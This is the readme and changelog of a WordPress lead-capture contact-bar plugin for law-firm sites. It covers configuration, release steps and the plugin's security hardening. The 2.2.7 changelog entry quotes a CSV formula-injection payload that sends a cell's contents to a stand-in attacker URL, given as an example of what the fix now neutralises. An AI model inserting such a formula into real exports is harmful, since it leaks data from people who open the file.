=== BSPE Connect ===
Contributors: bspelegalmarketing
Tags: contact, lead-capture, mobile, law-firm, sticky-bar
Requires at least: 6.0
Tested up to: 6.6
Requires PHP: 8.0
Stable tag: 2.4.0
License: Proprietary

Mobile-only contact bar with lead capture for BSPE Legal Marketing client sites.

== Description ==

BSPE Connect adds a bottom-fixed contact bar to mobile visitors with up to four
configurable buttons (Connect, Call, Text, Email), an optional welcome bubble,
and a built-in lead capture form. Submissions are stored in the WordPress
database and emailed to the firm.

The plugin is self-updating from a private GitHub repository under the BSPE
Legal Marketing organization.

== Installation ==

1. Upload the plugin zip via Plugins -> Add New -> Upload, or unpack into
   `wp-content/plugins/bspe-connect`.
2. Configure the wp-config.php constants below.
3. Activate the plugin from the Plugins screen.
4. Configure under the new "BSPE Connect" admin menu item (sidebar tabs
   from General through Analytics).

== wp-config.php constants ==

All three are optional. Constants always win over settings stored in the
database — define them when you want secrets out of options exports and
out of admin UIs.

* `BSPE_CONNECT_GITHUB_TOKEN` (string, OPTIONAL since v2.1.1)
  GitHub Personal Access Token. The repo is public, so updates work
  without this token — every install is zero-touch. Set it only if you
  want to raise the GitHub API rate limit from 60/hour (anonymous) to
  5,000/hour, or if the repo is ever flipped back to private.

  define('BSPE_CONNECT_GITHUB_TOKEN', 'ghp_...');

* `BSPE_CONNECT_UPDATE_CHANNEL` (string, 'stable' or 'beta')
  Default 'stable' — discovers updates via GitHub tags + releases.
  Set to 'beta' to follow the tip of the `beta` branch instead.

  define('BSPE_CONNECT_UPDATE_CHANNEL', 'beta');

* `BSPE_CONNECT_TURNSTILE_SECRET` (string)
  Cloudflare Turnstile secret key. When defined, takes precedence over
  the value stored in plugin settings (Form -> Anti-spam -> Turnstile
  secret key) so the secret never lands in the options table.

  define('BSPE_CONNECT_TURNSTILE_SECRET', '0x4AAAAAAA...');

== Phase 6 status ==

This release is the first stable client release:

* All Phase 1-5 features (admin shell, contact bar, welcome bubble,
  form modal, anti-spam, full settings UI, submissions table, CSV export,
  analytics REST endpoint and dashboard)
* GitHub Actions release workflow auto-builds and attaches a clean
  bspe-connect.zip on every tag push (uses .distignore to strip dev files)
* Self-update via plugin-update-checker from the public GitHub repo —
  every release surfaces as a standard "Update available" notice in
  wp-admin → Plugins; the admin clicks Update to install. Silent
  install was removed in v2.2.8 in favor of SHA-256 verification on
  every download — see Updater::verify_and_download_zip
* URL redaction filter for analytics page_url — sensitive query keys
  (token, password, email, etc.) are replaced with [redacted] before
  storage; extensible via the bspe_connect_redact_query_keys filter
* Turnstile secret can live in wp-config.php instead of options
* Documented wp-config.php constants and acceptance checklist in this
  readme

== Acceptance checklist (spec section 13) ==

Run through this list before installing on a new client site:

* [ ] Plugin activates without errors on PHP 8.0, 8.1, 8.2, 8.3
* [ ] Plugin activates without errors on WP 6.0, 6.4, 6.6, latest
* [ ] Default settings written on activation
* [ ] DB tables wp_bspe_connect_submissions and wp_bspe_connect_events
      created on activation
* [ ] Tables and options removed via uninstall.php
* [ ] Bar appears after 200px scroll on mobile only
* [ ] Bar hides on scroll up, shows on scroll down
* [ ] Welcome bubble appears 3s after bar, dismisses, persists per session
* [ ] All 4 buttons render and function (call dialer, sms app, two
      bottom-sheet form modes)
* [ ] Connect button toggles between text label and image mode
* [ ] Form submits via AJAX, validates, sanitizes, sends email, stores
      in DB
* [ ] Honeypot blocks submissions with the bspe_website field filled
* [ ] Time check blocks submissions under 2 seconds
* [ ] Rate limit blocks after 5 submissions per hour per IP
* [ ] Turnstile verifies when enabled (with site + secret keys)
* [ ] All admin pages require manage_options capability
* [ ] All form / settings POSTs verify nonces
* [ ] All output is escaped
* [ ] CSV export works on submissions page (filters honored)
* [ ] Analytics records events via /wp-json/bspe-connect/v1/event
* [ ] Analytics dashboard funnel + tiles + top pages render correctly
* [ ] Plugin-update-checker connects to public GitHub repo
* [ ] Standard update flow: tag, GitHub Actions builds zip + .sha256,
      WP detects update, admin clicks Update, SHA-256 verifies, install
      succeeds
* [ ] SHA-256 mismatch surfaces as WP_Error in the wp-admin UI when
      the .sha256 file is missing or doesn't match (validate by editing
      the .sha256 manually on a test release)
* [ ] No PHP notices / warnings in debug.log under WP_DEBUG=true
* [ ] No JS console errors on the bar or in admin
* [ ] No CSS conflicts with major themes (Astra, GeneratePress, Divi,
      Elementor's Hello)

== Releasing a new version ==

1. Update Plugin Version + BSPE_CONNECT_VERSION in bspe-connect.php
2. Update Stable tag + Changelog block in this file
3. Commit with the conventional message format
4. git tag -a vX.Y.Z and push the tag
5. gh release create vX.Y.Z (the GitHub Actions workflow will attach
   the clean bspe-connect.zip and bspe-connect.zip.sha256 to the release)
6. Every release surfaces as a standard "Update available" notice in
   wp-admin → Plugins on client sites. Silent auto-install was removed
   in v2.2.8 — the install proceeds only after the admin clicks Update,
   and only if the published .sha256 matches the downloaded zip.

== Changelog ==

= 2.4.0 =
* New: Form → Submissions retention. Optional auto-pruning of saved
  form submissions for installs that want to limit how long lead data
  is retained (GDPR / data-minimization use cases, or just keeping the
  table tidy).
  - New setting "Keep submissions for [N] days" under the Form tab.
  - Default is 0 = keep forever (backward-compatible — existing
    installs see no change).
  - When set to a positive value, a daily WP-cron job deletes any
    submissions whose submitted_at is older than the threshold.
  - Already-sent emails are NOT affected (they live in the recipient's
    inbox after wp_mail handed them off).
  - The analytics events table has its own separate 120-day retention
    (Events::RETENTION_DAYS, set in v2.2.7).
  - Cron is scheduled in Plugin::boot so installs that upgrade via PUC
    pick it up on the next page load. Cleared on deactivate / uninstall.
* Docs: removed stale "Auto-Update: yes" references from the
  installation, acceptance-checklist, releasing-instructions, and FAQ
  sections of readme.txt + README.md. v2.2.8 dropped silent auto-
  install in favor of SHA-256-verified manual-click updates; the docs
  now match the code. Historical changelog entries kept as-is.

= 2.3.1 =
* UX: the v2.3.0 palette-mapping panel showed each color as a row in
  a native dropdown — admins saw the hex string but not the actual
  color, which forced a mental hex-to-color translation per pick.
  Replaced with inline color chips: each row shows every palette
  color as a clickable swatch in a horizontal strip. Click a chip
  to assign it to that slot — a teal ring marks the selected one,
  and the row caption updates to show the picked color's name + hex.
  Clicking the same chip again clears the row. Tooltip on hover
  still shows the full "Name — #HEX" for accessibility / discovery.

= 2.3.0 =
* New: Design → Colors now has two preset shortcuts below the six
  color pickers.
  - "Use Plugin Default Colors" instantly resets every color to the
    BSPE Plum Noir palette (Plum, Ivory, Logo Teal).
  - "Use Default Website Colors" detects the host site's palette
    (Elementor first, with all system + custom colors; falls back to
    the block-theme theme.json palette) and opens a mapping panel
    where the admin manually picks which of their site's colors fills
    each BSPE Connect color slot. Every dropdown starts on
    "— Pick a color —" so the mapping is always an explicit choice,
    never an auto-guess. Apply pushes the picks into the color
    pickers, then the admin clicks Save Changes as normal.
* The Default Website Colors button is disabled with an explanation
  on sites without Elementor or a block theme (classic-theme installs
  without a theme.json palette).

= 2.2.8 =
* Supply-chain hardening — removed silent auto-install + added
  SHA-256 verification of every update zip.
  - The "Auto-Update: yes" marker that previously silent-installed
    flagged releases is no longer honored. Every release now surfaces
    in wp-admin → Plugins as a normal "Update available" notification.
    The site admin clicks Update and approves the install.
  - The GitHub Actions release workflow now attaches a
    bspe-connect.zip.sha256 file alongside each release zip.
  - Before WP extracts a downloaded update, the plugin fetches the
    published .sha256 from the matching release, hashes the local zip,
    and refuses the install on mismatch (returns WP_Error so the
    admin UI shows the failure). A compromised release can't get past
    this gate without ALSO compromising the checksum file in the same
    release — which requires the same level of GitHub access as the
    zip itself, and so doubles the attack difficulty.
  - Safety hatch: define BSPE_CONNECT_REQUIRE_CHECKSUM as false in
    wp-config to skip verification if a checksum somehow fails to
    upload and updates need to be unblocked manually. Default is true.
  - First-time effect: this v2.2.8 install itself is NOT verified
    (the v2.2.7 client doesn't have the hook yet). v2.2.9 and onwards
    are verified on every install path, including WP's native plugin
    auto-update toggle if an admin enables it.

= 2.2.7 =
* Security: defang CSV formula injection in the submissions export.
  Cells beginning with =, +, -, @, TAB, or CR are now prefixed with a
  leading apostrophe so a hostile name like
  =HYPERLINK("https://attacker/?leak="&A1,"Click") can no longer fire
  in Excel / Numbers / Google Sheets when an admin opens the export.
  The leading quote is invisible in the spreadsheet UI, so cosmetics
  are unchanged.
* Hardening: events table DoS protection. New global rate cap of 600
  events / minute backstops the existing 60/min per-IP limit — engages
  when REMOTE_ADDR is missing (reverse-proxy misconfig) or when
  distributed abuse spreads across many IPs. Plus a new daily cron
  prunes analytics events older than 120 days so the table can't grow
  indefinitely under sustained traffic. Cron is registered on
  plugins_loaded (catches PUC updates that skip the activation hook)
  and cleared on deactivate / uninstall.

= 2.2.6 =
* Email template rewrite. The notification email a firm receives on
  every form submission is now:
    - **On-brand** — the header band uses the firm's chosen Design →
      Colors values (bar_bg + button_fg + accent) instead of the
      hardcoded BSPE palette. Each install's emails now match its bar.
    - **Mobile-friendly** — proper viewport / x-apple-disable-message-
      reformatting metas, 600 px max-width with table-in-table
      structure, and a 480 px media query that drops paddings + stacks
      label/value pairs vertically on phones.
    - **Dark-mode safe** — color-scheme + supported-color-schemes
      metas plus a prefers-color-scheme:dark CSS block (and the
      [data-ogsc] mirror for Outlook.com Windows) so Apple Mail / Gmail
      iOS / Outlook properly swap to a dark page + dark card with light
      text instead of auto-inverting the design and nuking contrast.
      Body backgrounds + text stay neutral across modes so brand color
      choices never affect readability.
* Hex color values from settings are validated before rendering — any
  corrupt value falls back to the plugin default rather than leaking
  into the HTML.

= 2.2.5 =
* Fix: the "Hide on scroll up" toggle from v2.2.4 saved correctly but
  did nothing on the frontend. Root cause — wp_localize_script casts
  top-level scalars to strings, so the boolean arrived in JS as the
  string "1" / "0", and a strict `=== true` check always missed it.
  Replaced with a tolerant truthy check that explicitly rejects "0"
  and "false". Confirmed against the staging install where the data
  blob shows `"hideOnScrollUp":"1"`.

= 2.2.4 =
* Restore: General → Display behavior now has back the two scroll
  controls that used to live there before v2.1.2 collapsed them into
  pure delay-based showing —
    - "Hide at top of page" (px). When > 0 the bar stays hidden until
      the visitor scrolls past N pixels. 0 keeps the current always-
      shown-after-delay behavior, so existing installs see no change.
    - "Hide on scroll up" toggle. When on, the bar slides away as the
      visitor scrolls back up the page and reappears on the next
      downward scroll. Off by default.
  Both triggers are rAF-paced (no scroll-event spam) and the scroll
  listener only attaches when at least one is configured, so the
  default install pays no cost.

= 2.2.3 =
* Fix: analytics events were silently dropped on installs whose schema
  was created before the events table was added (or where the events
  table was lost in a backup/restore). Symptom — Logs showed
  "Analytics event INSERT returned 0 — DB write failed" for every event.
  Root cause — WordPress only runs the activation hook on first
  activation, never on PUC-driven updates, so installs that came up on
  an early version never got the table created. Fix is twofold:
  Plugin::boot now compares the stored bspe_connect_db_version against
  the constant on every page load and runs dbDelta when they differ
  (bumped DB_VERSION to 1.1.0 to force one migration on this upgrade);
  and Events::insert now logs the actual $wpdb->last_error so any
  remaining INSERT failures surface the underlying MySQL error.
* Design tab: the four button-padding controls (top / right / bottom /
  left) collapsed into a single row with mini T R B L inputs instead
  of taking four full settings rows. Same data, much tighter UI.
* Form modal: focusing a field now scrolls it into the visible area
  after the iOS soft keyboard appears (~280 ms delay), so the user no
  longer has to hand-scroll the modal to see what they're typing.

= 2.2.2 =
* Analytics pipeline instrumented end-to-end. Every Rest::handle_event
  decision (received / invalid type / rate-limited / cross-host /
  saved / DB-insert-failed) now writes a Logger entry so the Logs tab
  shows the exact path each request took.
* Frontend deliverEvent() now writes to the browser console on
  non-OK / failure / threw — covers the case where the request never
  reaches the server (page cache, content blocker, CSP).
* New "Insert test event" button on the Analytics tab — bypasses the
  JS + REST round-trip and inserts a single bar_shown row directly via
  the admin. Useful for isolating "is the JS not firing?" from "is the
  DB write failing?" — if the dashboard updates after clicking this,
  we know the gap is on the frontend / network side.

= 2.2.1 =
* Fix: admin select dropdowns rendered TWO chevron icons (the WP-admin
  forms.css background-image arrow + our custom .bspe-select-wrap::after
  arrow). Forced background-image: none + appearance: none with
  !important on .bspe-select so the native arrow is suppressed
  reliably across themes / page builders.
* Defaults flipped: global "Uppercase labels" defaults to OFF (was ON);
  Connect button defaults to "Force UPPERCASE" per its own override.
  Existing installs keep their saved values — only fresh activations
  pick up the new defaults. To match the new defaults on an existing
  site: Design tab → Uppercase labels → off; Buttons tab → Connect →
  Label case → Force UPPERCASE.
* Per-button label overrides now emit with `!important` on the CSS
  custom property and a double-class selector (specificity 1,2,0) so
  they win against any global var stomp from a theme or page-builder
  kit. The earlier 1,1,0 selector was tied with the wrapper rule and
  could lose source-order ties on some sites.

= 2.2.0 =
* Per-side button padding: replaced the single "Button vertical padding"
  control with four independent inputs — top / right / bottom / left —
  in Design -> Sizing & layout. Defaults: top 6, right 4, bottom 6,
  left 4 px. Existing installs running 2.1.x with a saved
  button_padding_y value carry that value into the new top + bottom
  fields automatically.
* New "Logs" tab in the sidebar — diagnostic ring buffer for
  troubleshooting. Off by default. Toggle "Enable logging" on, submit
  a test form, then read back what happened: which anti-spam stage
  ran, whether mail dispatched, what validation errors fired, etc.
  Caps at 200 entries, oldest-out, never autoloaded. "Clear logs"
  button wipes the buffer in one click.
* Form_Handler now logs every checkpoint at info / warn / error levels:
  nonce check, honeypot trigger, time trap, rate-limit hit, Turnstile
  result, validation errors, DB insert, mail send result. Secret
  values (token / secret / password / api_key / nonce) are auto-redacted
  before storage.
* Frontend JS now writes diagnostic console output on form submit
  failures so DevTools captures non-JSON responses, network errors,
  and the exact endpoint URL being hit. Useful even when server-side
  logging is off.

= 2.1.7 =
* Per-button label overrides: each of Connect / Call / Text / Email now
  has its own "Label weight" and "Label case" select on the Buttons
  tab. Both default to "Use Design tab default" so the global Design
  controls still rule unless you explicitly override per button. Useful
  when you want, e.g., Connect bold + UPPERCASE while Call / Text /
  Email render in regular weight + saved case.
* Frontend emits per-button CSS variable overrides scoped to
  `.bspe-connect__btn--<key>` so the existing `.bspe-connect__btn`
  rule picks up the right value via cascade. Buttons with no override
  emit no CSS — zero added bytes for the common case.

= 2.1.6 =
* CRITICAL FIX: form submissions on iOS Safari were 404'ing because
  the JS read `form.action` (HTMLFormElement.action property) which
  WebKit shadows with the form's named input — and our form has a
  hidden `<input name="action">` because admin-ajax.php requires it.
  Result: fetch() received an HTMLInputElement, coerced it to the
  string "[object HTMLInputElement]", resolved that relative to the
  page URL, and POSTed to a nonsense path. WP returned 404 → the JS
  caught the non-JSON response → showed "Something went wrong.
  Please try again."

  Fixed by reading the action attribute via `form.getAttribute('action')`,
  which always returns the attribute string regardless of named-input
  collisions. Also added `ajaxUrl` to the localized BSPE_CONNECT_DATA
  as a belt-and-suspenders fallback.

= 2.1.5 =
* Fix: mobile breakpoint setting was off by one — entering 768 actually
  hid the bar at 769 and above, so a 768 px iPad-portrait viewport saw
  the bar instead of staying mobile-only-up-to-767. Dropped the +1 in
  the inline media-query emitter so the setting now matches Bootstrap-
  style breakpoint convention: "the value is the FIRST non-mobile
  width." Setting 768 hides the bar at viewports 768+ inclusive.
* Default labels are now UPPERCASE with weight 500. Matches the look
  in the original mockups and gives the bar a stronger CTA feel.
  Existing settings keep their saved value; the default just changes
  for fresh installs.
* New Design tab controls (4 added):
    - **Button vertical padding** (2-24 px, default 6) — controls
      total bar height
    - **Icon ↔ label gap** (0-16 px, default 2)
    - **Label weight** — Regular (400) / Medium (500) / Semibold (600)
      / Bold (700); default 500
    - **Uppercase labels** toggle (default ON)
  All four wire to CSS custom properties emitted in <head> so they
  apply on the bar without any frontend JS.

= 2.1.4 =
* Icon libraries: removed Brand SVGs, Ionicons, and Dripicons. Only
  Font Awesome 6 Free (Solid + Regular variants) and "No icon" are
  available now. Drops a CSS + JS dependency on every public page that
  used Ionicons (web component script ~70KB) or Dripicons (~80KB
  webfont) and removes the bundled brand SVGs (~15KB) — net public
  bundle weight is smaller.
* Defaults: Call / Text / Email default to Font Awesome Solid with
  sensible icons (phone / comment-dots / envelope). Connect stays
  label-only. Existing settings pointing at brand / Ionicons /
  Dripicons icons get migrated to a Font Awesome equivalent at read
  time so upgrading clients see no broken icons before their next save.
* Default sizes: icon 16 px (was 18), label 12 px (was 11). Smaller
  bar footprint by default; still adjustable in Design -> Sizing.
* Connect button label size now matches the others — removed the
  uppercase / bumped-size treatment that fired when the button had
  no icon.
* Design tab: removed the "BSPE brand palette" reference card. The
  default color values in the Colors card already preserve the brand;
  the read-only swatches were redundant.
* Admin header: new "Built by <strong>BSPE Legal Marketing</strong>"
  link in the top-right meta area, alongside the version badge. Links
  to https://bsplegalmarketing.com/ in a new tab.
* Plugin Author URI in the header docblock updated to
  https://bsplegalmarketing.com/ (was https://bspelegalmarketing.com).

= 2.1.3 =
* "Save changes" button on every settings form now sits at 50% opacity
  until you actually change something — as soon as any field's value
  diverges from the saved snapshot, the form gets `.is-dirty` and the
  button snaps to full opacity (with a "You have unsaved changes"
  tooltip). Captures the initial form state via FormData snapshot on
  page load and re-compares on every `input` / `change` event.

= 2.1.2 =
* Connect button simplified: removed the "Custom image" mode and the
  Media Library picker (it wasn't working reliably). Connect is now
  label + optional library icon only. Default Icon library for the
  Connect button changed from "Brand SVGs" to "No icon (label only)"
  so the prominent first button defaults to a clean text-only CTA.
* Visual icon picker for every library. Choosing Font Awesome,
  Ionicons, or Dripicons in the Icon library select now shows the
  curated icons rendered live (using the library's actual CSS / web
  component) — no more typing slugs blind. Each button has its own
  curated set:
    Connect / Text — comments / chatbubbles / message variants
    Call           — phone / mobile / call variants
    Email          — envelope / mail / paper-plane / at variants
* Brand SVG library trimmed from 4 to 3 variants per button. The 4th
  variant (connect-4 / call-4 / etc.) was the noisiest of the set;
  3 keeps the picker visually balanced. Existing settings pointing
  to *-4 fall back to *-1 on the next save.
* Bar trigger switched from scroll-based to time-delay-based. Old
  behavior: bar appeared after the visitor scrolled past 200px and
  hid on scroll-up. New behavior: bar shows after a configurable
  delay (default 3 seconds) and stays visible. Removed the scroll
  threshold and "hide on scroll up" settings; added "Show after
  delay (seconds)" in General -> Display behavior.
* Admin Buttons tab: enqueues Font Awesome / Ionicons / Dripicons
  CDNs only when active so the visual picker previews render
  real glyphs.

= 2.1.1 =
* Fix: bar button labels disappeared on mobile because the form's
  visually-hidden label rule (added in 2.1.0) wasn't scoped to the
  form container — it matched every `.bspe-connect__label` on the
  page, including the ones under each bar button. Re-scoped to
  `.bspe-connect__form .bspe-connect__label` so the form fields
  stay screen-reader-accessible while the bar labels render.
* Feature: live-swap icon picker. Changing the Icon library select
  now hides / shows the matching picker (brand 4-radio vs custom
  icon-name text input) without requiring a save and reload. Powered
  by data-bspe-icon-pane attributes on each row + a small JS handler.
* Feature: "No icon (label only)" option in the Icon library select.
  Pick this on any button to skip the icon entirely and let the label
  carry the meaning — useful for "Reserve" or "Quote" style CTAs.
  Label-only buttons get bumped font-size, weight, and uppercase
  treatment so they don't look stranded.
* Updater: GitHub PAT is now OPTIONAL. The repo is public, so updates
  poll without authentication. Existing installs that have a token
  defined keep using it (which raises the GitHub API rate limit from
  60/hr anonymous to 5,000/hr). Sites without a token now also get
  one-click updates with no setup. Removed the "GitHub token not
  configured" admin notice — no longer accurate or needed.

= 2.1.0 =
* Icon libraries: each button can now render its icon from Font Awesome
  6 Free (Solid + Regular variants), Ionicons 7 (Filled + Outline), or
  Dripicons in addition to the bundled brand SVG set. CDN scripts /
  styles are only enqueued when at least one button uses that library.
  Per-button library is set under Buttons -> {button} -> Icon library;
  the icon name field accepts the kebab-case identifier from each
  library's docs (e.g. "comments" for Font Awesome, "chatbubbles" for
  Ionicons, "dripicons-message" for Dripicons).
* Connect button now uses the brand Logo Teal directly with a small
  right-pointing chevron extension that hints at the rest of the bar.
* Bubble close X moved to the absolute top-right corner so the avatar +
  message can use the full width of the bubble.
* Form modal: optional subheading line under the heading, configurable
  per source (text vs email). Default heading is now "Send us an email"
  / "Send us a text" and default subheading is "Please enter your name
  and contact info." for both.
* Form fields: visible labels replaced with screen-reader-only labels
  + placeholders for visible cue. Required fields show a "*" suffix in
  the placeholder.
* Cloudflare Turnstile widget now stretches to fill the form column
  instead of being centered awkwardly.
* New Design controls: Icon size (12-48 px, default 18) and Label size
  (8-20 px, default 11). Outputs as CSS custom properties so any future
  per-page override can hook into them.
* Connect button label color is now under the #bspe-connect specificity
  prefix so themes setting span color via class selectors (e.g.
  Elementor) don't bleed into the bar's label color.

= 2.0.2 =
* Fix: Elementor's per-kit inline CSS uses descendant selectors like
  `.elementor-kit-9604 button { ... }` (specificity 0,1,1) which beat
  our class-only `.bspe-connect__btn` rule (0,1,0) — leaving the bar's
  Connect and Email buttons rendered with the kit's light-gray fill,
  modal close buttons unstyled, and form inputs styled with Elementor's
  zero-padding underline-only treatment. Re-prefixed every <button>-
  and <input>-targeting rule with `#bspe-connect ` (the wrapper's id)
  so our specificity (1,1,0+) wins against any descendant override
  from page-builders / themes. Verified against the Hello Elementor +
  Elementor Pro stack.

= 2.0.1 =
* Fix: iOS Safari rendered Connect and Email buttons (and the bubble's
  close button) with the native UA stylesheet because -webkit-appearance
  was never reset. Added explicit appearance:none and a no-radius/no-pad
  reset to all <button>-rendered controls so they pick up the brand
  Plum / Teal styling consistently. The X icon inside the bubble close
  button now renders.
* Design: Connect button now uses the brand "Pop / CTA" color (Logo Teal)
  instead of a near-imperceptible 90/10 plum-teal mix, so it visually
  separates from Call/Text/Email as the primary action.
* Sizing: shrank icons from 22px to 20px, reduced gap between icon and
  label from 4px to 2px, tightened button padding (8/6/10 -> 6/4/7),
  and dropped the bar min-height from 60px to 52px so the bar takes
  less of the mobile viewport.
* Compat: added a @supports fallback so the hover/focus tints don't
  blank out on Safari < 16.2 (which lacks color-mix()).

= 2.0.0 =
* Phase 6: first stable release. Adds GitHub Actions workflow that builds
  and attaches a clean bspe-connect.zip to every tag release (uses
  .distignore so the install matches production exactly). Implements the
  Auto-Update: yes flag — releases marked with this string in their
  release notes (or readme changelog block) install silently via WP's
  auto_update_plugin filter; everything else stays as a manual one-click
  update. Adds a URL redaction pass on analytics page_url to strip
  sensitive query keys (token, password, email, etc.) before storage,
  extensible via the bspe_connect_redact_query_keys filter. Reads
  BSPE_CONNECT_TURNSTILE_SECRET from wp-config.php with precedence over
  the options-stored secret. Documents all three wp-config.php constants
  and the spec section 13 acceptance checklist in this readme.

= 1.5.0 =
* Phase 5: analytics. New Events class for the wp_bspe_connect_events
  table (insert + per-type counts + distinct-session counts + top-pages
  + daily histogram). New Rest class registering POST
  /wp-json/bspe-connect/v1/event with same-host page_url filter and
  per-IP rate limiting. New Analytics_Controller with funnel-stage
  resolution. Sidebar gets a 7th tab "Analytics" (Submissions tab keeps
  its inbox icon; analytics gets the bar-chart icon). Frontend JS
  generates a session_id (crypto.randomUUID with Math.random fallback)
  and POSTs every event in fire() with keepalive so unloads don't
  drop them.

= 1.4.0 =
* Phase 4: full admin settings UI. All six tabs functional with per-tab
  sanitization. Adds reusable Components helpers (toggle switch, checkbox,
  radio pills, icon radio, color picker, media library picker, number with
  suffix, select). Adds the Submissions list with filters, paginated table
  with expandable rows, and CSV export. Saved-state notice with brand-tinted
  styling. Conditional field handling (required disabled when visible off,
  avatar field shown only when "Show avatar" is on).

= 1.3.0 =
* Phase 3: bottom-sheet lead capture modal, AJAX submission handler with
  the full anti-spam pipeline (nonce, honeypot, time trap, rate limit,
  Cloudflare Turnstile), HTML mailer with template variables and header
  safety, phone live mask with 10-digit US validation, and the success
  state with auto-close after 3 seconds.

= 1.2.0 =
* Phase 2: mobile contact bar with bottom-fixed positioning, scroll-trigger
  show/hide, welcome bubble with avatar/dismissal, display rules, inline
  CSS variables driven by Design settings, Google Font enqueueing, and 16
  line-icon SVG variants (4 per button type).

= 1.1.0 =
* Admin shell: replaced top tabs with a left sidebar nav rail; added
  inline-SVG section icons and a pulsing teal active indicator.

= 1.0.0 =
* Phase 1 skeleton: activation, database schema, default settings, admin
  shell with tab navigation, plugin-update-checker integration.

== Frequently Asked Questions ==

= Where is submission data stored? =

In two custom tables, `wp_bspe_connect_submissions` and
`wp_bspe_connect_events`. They are created on activation and destroyed only
when the plugin is uninstalled (not when deactivated).

= How do updates work? =

The plugin checks the `BSPE-Legal-Marketing/bspe-connect` GitHub repository
every 12 hours using the bundled `plugin-update-checker` library. Every
release surfaces as a standard "Update available" notice in wp-admin →
Plugins. The admin clicks Update to install. Before WP extracts the
downloaded zip, the plugin fetches the matching `bspe-connect.zip.sha256`
file from the release, hashes the zip locally, and refuses the install
on mismatch (so a tampered release can't be applied). Silent auto-install
was removed in v2.2.8.

= Why is the GitHub token in wp-config.php instead of a settings field? =

So it is never written to the database, never appears in a backup of the
options table, and never gets exposed by a settings export.
